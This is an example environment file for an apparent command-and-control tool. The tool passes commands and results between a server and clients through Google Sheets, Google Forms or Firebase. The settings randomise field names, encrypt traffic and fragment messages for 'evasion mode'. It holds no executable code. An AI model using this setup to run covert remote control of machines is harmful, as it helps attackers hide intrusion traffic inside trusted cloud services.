# ─────────────────────────────────────────────
# Channel selection
# ─────────────────────────────────────────────
# "sheets" (default) or "firebase"
CHANNEL=sheets

# ─────────────────────────────────────────────
# Firebase Realtime Database (CHANNEL=firebase)
# ─────────────────────────────────────────────
# FIREBASE_URL=https://<project-id>-default-rtdb.firebaseio.com
# FIREBASE_INBOX_PATH=c2/inbox
# FIREBASE_OUTBOX_PATH=c2/outbox
#
# Firebase field name obfuscation (optional)
# Same concept as Sheets column maps — replaces logical JSON key names
# (command_id, status, etc.) with random strings in the Firebase document.
# Both client and server must use the same maps.
#
# FIREBASE_INBOX_COLUMN_MAP={"command_id":"f3a7k","command":"x9m2p","payload":"b4r8w","target":"d1n5q","status":"h6v3j","created_at":"k2y9t"}
# FIREBASE_OUTBOX_COLUMN_MAP={"command_id":"p7c4s","client_id":"m1z8e","status":"w5g2u","result":"a9b3l","timestamp":"r6q7n"}

# ─────────────────────────────────────────────
# Google Spreadsheet (CHANNEL=sheets)
# ─────────────────────────────────────────────

# From the sheet URL: /d/<SPREADSHEET_ID>/edit
SPREADSHEET_ID=

# Tab GIDs — URL param ?gid=X when each tab is active
# Re-check after linking Forms — linking creates new tabs with new GIDs
# CONFIG_GID is no longer required — client config is sent via the "config" command instead
# CONFIG_GID=
INBOX_GID=
OUTBOX_GID=

# ─────────────────────────────────────────────
# Google Forms
# ─────────────────────────────────────────────

# Outbox Form — client writes results here
# URL must end in /formResponse (not /viewform)
FORMS_URL=
# JSON: logical field name → entry ID (get entry IDs from form devtools, search "entry.")
# Required keys: command_id, client_id, status, result, timestamp
FORMS_FIELD_MAP={"command_id":"entry.XXXXXXXXX","client_id":"entry.XXXXXXXXX","status":"entry.XXXXXXXXX","result":"entry.XXXXXXXXX","timestamp":"entry.XXXXXXXXX"}

# Inbox Form — server dispatches tasks here
INBOX_FORMS_URL=
# Required keys: command_id, command, payload, target, status, created_at
INBOX_FORMS_FIELD_MAP={"command_id":"entry.XXXXXXXXX","command":"entry.XXXXXXXXX","payload":"entry.XXXXXXXXX","target":"entry.XXXXXXXXX","status":"entry.XXXXXXXXX","created_at":"entry.XXXXXXXXX"}

# ─────────────────────────────────────────────
# Encryption
# ─────────────────────────────────────────────

# ENCRYPTION_METHOD: "plaintext" (default, no encryption) or "fernet"
# Generate a Fernet key: python crypto/fernet.py
ENCRYPTION_METHOD=plaintext
ENCRYPTION_KEY=

# ─────────────────────────────────────────────
# Column name obfuscation (optional)
# ─────────────────────────────────────────────
#
# Maps logical field names → random column header names used in the sheet.
# When set, the sheet column headers and form field labels must be renamed to match.
# When unset, logical names are used (command_id, status, etc.) — default/debug mode.
#
# Generate your own random names or use these as a starting point.
# Rename the corresponding form field labels in Google Forms to match,
# then the linked sheet columns will update automatically.
#
# CONFIG_COLUMN_MAP — config tab is deprecated, no longer used
# CONFIG_COLUMN_MAP={"key":"c8x2n","value":"q5r1m"}
#
# Inbox column map (logical → random sheet column name):
INBOX_COLUMN_MAP={"command_id":"f3a7k","command":"x9m2p","payload":"b4r8w","target":"d1n5q","status":"h6v3j","created_at":"k2y9t"}
#
# Outbox column map (logical → random sheet column name):
OUTBOX_COLUMN_MAP={"command_id":"p7c4s","client_id":"m1z8e","status":"w5g2u","result":"a9b3l","timestamp":"r6q7n"}

# ─────────────────────────────────────────────
# Fragmentation (optional)
# ─────────────────────────────────────────────
#
# FRAGMENT_METHOD: "passthrough" (default, no fragmentation) or "fixed"
# FRAGMENT_CHUNK_SIZE: max chars per chunk before encryption (default 2000)
#   - 2000 leaves safe headroom for Fernet base64 overhead within the ~4000
#     char Google Forms field limit
#   - Lower values = more fragments, smaller per-poll footprint (evasion mode)
#
FRAGMENT_METHOD=passthrough
# FRAGMENT_CHUNK_SIZE=2000

# ─────────────────────────────────────────────
# Sheets cleanup (optional, CHANNEL=sheets only)
# ─────────────────────────────────────────────
#
# Path to a Google service account JSON key file.
# When set, the server automatically deletes inbox entries from the sheet
# after each result is confirmed — keeps the inbox lean without manual cleanup.
#
# Setup:
#   1. IAM & Admin → Service Accounts → Create → download JSON key
#   2. Share the spreadsheet with the service account email (Editor role)
#   3. Set the path below
#
# GOOGLE_SERVICE_ACCOUNT_JSON=/path/to/service-account.json

# ─────────────────────────────────────────────
# OpenAI
# ─────────────────────────────────────────────

# Required for: python server.py ai
OPENAI_API_KEY=sk-...
